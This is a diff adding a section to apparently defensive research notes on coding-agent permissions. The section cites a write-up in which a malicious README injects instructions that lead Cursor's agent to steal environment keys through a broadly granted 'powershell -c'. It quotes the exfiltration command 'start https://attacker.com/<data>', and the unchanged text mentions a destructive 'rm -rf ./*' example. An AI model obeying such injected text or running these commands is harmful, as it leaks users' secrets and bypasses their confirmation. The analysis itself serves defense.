@@ -147,6 +147,18 @@ Verbatim, the default position:
 6. **The `sudo` channel in Cursor, and removing cloud secrets before the agent phase in Codex, are both "the model should not be able to see the secret"** — a design goal the corpus implicitly assumes is never met.
 7. **Session-granted permissions are the risk to warn about**, in all three tools that offer them, and Copilot CLI's own `rm -rf ./*` example is the sharpest available.
 
+### Corroborated from outside, 2026-09-29 — and this closes a gap in the section above
+
+Everything in the preceding three paragraphs about session grants came from **vendor documentation describing the sharp edge**. Independent researchers then **exploited it**, which is a stronger finding than either alone.
+
+0din (Edward Morris), `https://0din.ai/blog/stealing-environment-keys-from-cursor-ide-with-a-malicious-readme`, read in full 2026-09-29:
+
+> "Cursor's permission model is vulnerable because repeated prompts encourage users to allow broadly defined commands like `powershell -c`, which then enables nearly any terminal action without further user confirmation."
+
+**That is the mechanism above, demonstrated.** Cursor's docs say a broad grant persists; 0din shows what the persistence is worth. Their exfiltration channel was `"start https://attacker.com/<data>"` — **not an unusual tool but the default browser, opened by an ordinary shell command.** A reader who took "session grants are broad" as a theoretical sharp edge now has a worked exploit against the same product.
+
+**Read with 0din's "lethal trifecta" framing — access to private data, exposure to untrusted content, and the ability to communicate externally — this is the structural reason the table above matters.** All three are handed to a coding agent by default, and the remaining research in this effort is a catalogue of what happens next. Full findings: [`RESEARCH-INJECTION-2026-09-29.md`](RESEARCH-INJECTION-2026-09-29.md).
+
 ## What remains open
 
 - **Cursor's shipped sandbox default.** Both Cursor pages document `enabled` and `disabled` without naming the default. Not inferred here.
